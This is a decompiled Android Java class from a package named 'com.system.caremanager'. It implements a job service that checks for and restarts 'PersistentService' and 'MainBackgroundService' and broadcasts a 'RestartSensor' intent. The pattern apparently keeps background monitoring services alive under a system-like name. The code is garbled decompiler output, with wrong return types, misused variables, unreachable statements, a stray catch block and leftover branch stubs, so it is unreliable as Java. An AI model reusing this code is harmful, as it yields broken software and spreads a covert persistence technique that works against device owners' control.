package com.system.caremanager;

import android.app.Service;
import android.app.job.JobService;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;

public class PersistentJobService extends JobService {

    private int JobId;

    public PersistentJobService() {
        int val = 100;
        this.JobId = val;
        return;
    }

    private boolean isServiceWork(Context param1, String param2) {
        String str = "activity";
        Object result = param1.getSystemService(str);
        result = (ActivityManager) result;
        int val = 100;
        List result2 = result.getRunningServices(val);
        if (result != null) {
            // branch: cond_0
        }
        return null;
        Iterator result3 = result.iterator();
        boolean result4 = result.hasNext();
        if (result == null) {
            // branch: cond_2
        }
        Object result5 = result.next();
        result = (ActivityManager.RunningServiceInfo) result;
        ComponentName service = result.service;
        String result6 = service.getClassName();
        boolean result7 = result.equals(param2);
        if (result == null) {
            // branch: cond_1
        }
        return 1;
        return null;
    }

    public int onStartCommand(Intent param1, int param2, int param3) {
        Intent intent = new Intent();
        Context result = this.getApplicationContext();
        Class cls = RestartSensorReceiver.class;
        String str = "RestartSensor";
        Intent result2 = intent.setAction(str);
        this.sendBroadcast(result);
        return 1;
    }

    public boolean onStartJob(JobParameters param1) {
        try {
            Class cls = PersistentService.class;
            String result = PersistentService.class.getName();
            boolean result2 = this.isServiceWork(p0, result);
            if (result != null) {
                // branch: cond_0
            }
            Intent intent = new Intent();
            Class cls2 = PersistentService.class;
            ComponentName result3 = this.startService(intent);
            Class cls3 = MainBackgroundService.class;
            String result4 = MainBackgroundService.class.getName();
            boolean result5 = this.isServiceWork(p0, result);
            if (result != null) {
                // branch: cond_4
            }
            Intent intent2 = new Intent();
            Class cls4 = MainBackgroundService.class;
            ComponentName result6 = this.startService(intent2);
            // continue loop -> :goto_4
            } catch (Exception e) {
                e.printStackTrace();
            Boolean result7 = Boolean.valueOf(1);
            boolean result8 = result.booleanValue();
            if (result == null) {
                // branch: cond_1
            }
            Boolean result9 = Boolean.valueOf(null);
            // continue loop -> :goto_0
            boolean result10 = result.booleanValue();
            if (result == null) {
                // branch: cond_2
            }
            Boolean result11 = Boolean.valueOf(null);
            // continue loop -> :goto_1
            boolean result12 = result.booleanValue();
            if (result == null) {
                // branch: cond_3
            }
            Boolean result13 = Boolean.valueOf(null);
            // continue loop -> :goto_2
            boolean result14 = result.booleanValue();
            if (result == null) {
                // branch: cond_4
            }
            Boolean result15 = Boolean.valueOf(null);
            // continue loop -> :goto_3
            Intent intent3 = new Intent();
            Context result16 = this.getApplicationContext();
            Class cls5 = RestartSensorReceiver.class;
            String str = "RestartSensor";
            Intent result17 = intent3.setAction(str);
            this.sendBroadcast(result);
            return null;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public boolean onStopJob(JobParameters param1) {
        return null;
    }

}